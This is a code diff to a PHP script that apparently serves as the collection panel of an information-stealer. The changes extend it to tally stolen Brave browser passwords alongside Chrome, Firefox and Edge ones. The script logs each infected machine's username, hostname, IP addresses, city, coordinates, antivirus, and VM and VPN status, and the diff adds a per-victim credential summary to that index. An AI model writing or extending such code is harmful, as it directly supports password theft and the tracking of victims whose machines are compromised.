@@ -196,10 +196,12 @@ if ($decoded_json) {
         $chrome_count = isset($cred_summary['chrome_passwords']) ? $cred_summary['chrome_passwords'] : 0;
         $firefox_count = isset($cred_summary['firefox_passwords']) ? $cred_summary['firefox_passwords'] : 0;
         $edge_count = isset($cred_summary['edge_passwords']) ? $cred_summary['edge_passwords'] : 0;
-        $cred_count = $chrome_count + $firefox_count + $edge_count;
+        $brave_count = isset($cred_summary['brave_passwords']) ? $cred_summary['brave_passwords'] : 0;
+        $cred_count = $chrome_count + $firefox_count + $edge_count + $brave_count;
         if ($chrome_count > 0) $cred_browsers[] = "Chrome({$chrome_count})";
         if ($firefox_count > 0) $cred_browsers[] = "Firefox({$firefox_count})";
         if ($edge_count > 0) $cred_browsers[] = "Edge({$edge_count})";
+        if ($brave_count > 0) $cred_browsers[] = "Brave({$brave_count})";
     }
 }
 
@@ -371,6 +373,7 @@ $machine_exists = false;
 foreach ($index_lines as &$iline) {
     if (strpos($iline, $machine_id) !== false) {
         // Update existing entry with latest info
+        $cred_info = $cred_count > 0 ? ' | Creds: ' . $cred_count . ' (' . implode(',', $cred_browsers) . ')' : '';
         $iline = date('Y-m-d H:i:s') . " | MID: " . $machine_id . " | IP: " . $sender_ip
                . " | User: " . $username . " | Host: " . $hostname
                . " | PubIP: " . $pub_ip . " | Loc: " . $city . ", " . $country
@@ -378,7 +381,8 @@ foreach ($index_lines as &$iline) {
                . " | AV: " . substr($antivirus, 0, 30)
                . " | VM: " . ($vm_status !== '?' ? 'YES' : 'No')
                . " | VPN: " . ($vpn_status !== 'No VPN/Proxy detected' ? 'YES' : 'No')
-               . " | Coords: " . $coords;
+               . " | Coords: " . $coords
+               . $cred_info;
         $machine_exists = true;
         break;
     }
@@ -386,6 +390,7 @@ foreach ($index_lines as &$iline) {
 unset($iline);
 
 if (!$machine_exists) {
+    $cred_info = $cred_count > 0 ? ' | Creds: ' . $cred_count . ' (' . implode(',', $cred_browsers) . ')' : '';
     $index_lines[] = date('Y-m-d H:i:s') . " | MID: " . $machine_id . " | IP: " . $sender_ip
                    . " | User: " . $username . " | Host: " . $hostname
                    . " | PubIP: " . $pub_ip . " | Loc: " . $city . ", " . $country
@@ -393,7 +398,8 @@ if (!$machine_exists) {
                    . " | AV: " . substr($antivirus, 0, 30)
                    . " | VM: " . ($vm_status !== '?' ? 'YES' : 'No')
                    . " | VPN: " . ($vpn_status !== 'No VPN/Proxy detected' ? 'YES' : 'No')
-                   . " | Coords: " . $coords;
+                   . " | Coords: " . $coords
+                   . $cred_info;
 }
 
 file_put_contents($index_file, implode("\n", $index_lines) . "\n", LOCK_EX);
